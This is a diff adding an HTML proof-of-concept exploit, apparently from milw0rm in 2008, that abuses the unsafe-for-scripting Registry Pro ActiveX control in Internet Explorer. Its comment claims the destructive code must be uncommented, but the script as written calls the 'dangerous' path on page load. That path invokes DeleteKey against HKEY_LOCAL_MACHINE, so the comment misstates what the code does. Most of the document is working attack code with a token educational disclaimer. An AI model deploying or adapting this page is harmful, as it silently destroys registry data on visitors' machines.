@@ -1,0 +1,69 @@
+<HTML>
+<!--
+
+        - Registry Pro (epRegPro.ocx) Remote Insecure Exploit -
+        
+                Author: t0pP8uZz
+                Homepage: h4ck-y0u.org / milw0rm.com
+                Description: ActiveX Remote Insecure
+                
+                Report: Tested on Microsoft Windows XP Pro (SP2 ) Internet Explorer 7 Fully Patched
+                
+                ActiveX: http://www.evansprogramming.com/registry_pro.asp
+        
+                The Following Material Is For Educational Purposes Only - I will not be held responsable for any illegal actions.
+                
+                NOTE: the first parameter in the DeleteKey() function is vulnerble to BoF. And can possiblly overwrite the EIP
+        
+                InternetExplorer can Initialise this ActiveX control, And take advantage of its functions.
+                Included in this exploit (POC) is a peice of javascript code lauching the ActiveX control, and executing one of its functions. the function being About()
+                all this will do is lauch a friendly, harmless dialog box, therefore being the perfect POC.
+                
+                Also i added a peice of code that will delete specific REGKEYS or infact possible delete a whole subkey/branch. to use this code it has to be uncommented.
+                
+        - epRegPro.ocx -
+        
+                About           Displays the Registry Pro About Dialog.
+                CreateKey               Creates a registry key.
+                DeleteBranch     Deletes a branch and all it child keys and values.
+                DeleteKey               Deletes one registry key.
+                DeleteValue             Deletes one registry value.
+                EnumKeys                Returns a collection containing all keys within a specified branch.
+                EnumValues              Returns a collection containing all values within a specified key.
+                QueryType               Returns a value type.
+                QueryValue              Returns a value.
+                RenameKey               Renames a key.
+                SetValue                Sets or creates a value.
+                
+        Peace.
+
+-->
+<OBJECT ID="RegPro" CLASSID="CLSID:D5C839EB-DA84-4F98-9D42-2074C2EE9EFC">Could Not Load ActiveX Control.</OBJECT>
+<script language="javascript">
+/* - Registry Pro (epRegPro.ocx) Remote Insecure Exploit - */
+/*                       Javascript Code By t0pP8uZz                        */
+
+var keyname = "Software/key"; // Registry key to delete
+
+Exploit("harmless"); // Change argument to "dangerous" to delete specified reg key.
+Exploit("dangerous"); // Change argument to "dangerous" to delete specified reg key.
+
+function Exploit(type) {
+
+        switch(type) { 
+                
+                case "harmless":
+                default:
+                        RegPro.About(); // Simple Harmless POC
+                        break
+                        
+                case "dangerous":
+                        RegPro.DeleteKey(80000002, keyname); // 80000002 HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER  80000001h UNCOMMENTING THIS LIKE WILL DELETE REGISTRY KEYS
+                        break
+        }
+}
+
+</script>
+</HTML>
+
+# milw0rm.com [2008-03-17]
